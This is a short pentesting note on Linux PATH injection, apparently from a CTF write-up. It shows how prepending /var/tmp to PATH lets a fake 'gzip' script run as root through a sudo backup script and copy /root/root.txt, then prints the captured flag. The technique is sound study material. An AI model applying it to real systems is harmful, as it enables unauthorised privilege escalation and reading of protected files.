---
description: >-
  PATH is an environment variable that specifies the set of directories where an
  executable can be located.
---

# Linux Path Injection

### Path&#x20;

```bash
$ echo $PATH             
/home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
```

A user account's PATH variable is a set of absolute path's. This way users can type a command like `smbclient` instead of the whole absolute path like `/usr/bin/smbclient` .

### Path abuse

To abuse this we can either add `.` to the users path we can run binaries from our current working directory.&#x20;

```bash
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH

# you can here the . has been added.
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

But it also possible to use /var/tmp like `export PATH=/var/tmp:$PATH` .&#x20;

```bash
echo $PATH
/var/tmp:.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Having set a new path variable its possible to create or copy a binary to that location in this case /var/tmp. A binary gzip is being executed as root so by making a new gzip binary in /var/tmp it will get executed first.

We can run any command as root, either making a reverse shell or reading root flag.

```bash
# Make duplicate gzip 
mczen:/var/tmp$ echo 'cat /root/root.txt > /tmp/root.txt' > gzip
mczen:/var/tmp$ chmod +x gzip

# the backup.sh calling gzip as root.
mczen:/var/tmp$ sudo /opt/scripts/backup.sh
[sudo] password for m4lwhere: 

# Get root flag.
mczen:/var/tmp$ ls /tmp
root.txt                                                                 
mczen:/var/tmp$ cat /tmp/root.txt
b8e6d482f0f446d7d5e85ec2e77b238e
```
